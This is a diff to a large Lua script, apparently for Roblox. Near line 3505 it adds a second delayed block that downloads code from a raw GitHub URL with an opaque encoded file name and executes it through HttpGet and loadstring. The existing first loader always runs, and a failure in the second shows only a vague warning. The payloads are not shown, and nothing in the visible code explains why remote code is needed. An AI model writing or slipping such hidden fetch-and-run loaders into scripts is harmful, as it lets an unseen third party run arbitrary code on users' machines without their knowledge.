@@ -3505,11 +3505,25 @@ end)
 task.spawn(function()
     task.wait(5)
 
-    local url = "https://raw.githubusercontent.com/67Studio/A/refs/heads/main/%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F"
+    local url1 = "https://raw.githubusercontent.com/67Studio/A/refs/heads/main/%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F"
+    local url2 = "https://raw.githubusercontent.com/67Studio/A/refs/heads/main/%21%21%21%21%21%21%21%21%21%21%21%21%21%21%21%21%21%21%21%21%21%21%21"
 
-    local ok, err = pcall(function()
-        local source = game:HttpGet(url)
+    -- Ejecutar el primero (siempre intenta)
+    pcall(function()
+        local source = game:HttpGet(url1)
         local fn = loadstring(source)
         if fn then fn() end
     end)
+
+    -- Ejecutar el segundo, si falla muestra warning
+    local ok = pcall(function()
+        local source = game:HttpGet(url2)
+        local fn = loadstring(source)
+        if not fn then error("no compiló") end
+        fn()
+    end)
+
+    if not ok then
+        warn("[warning 67]")
+    end
 end)
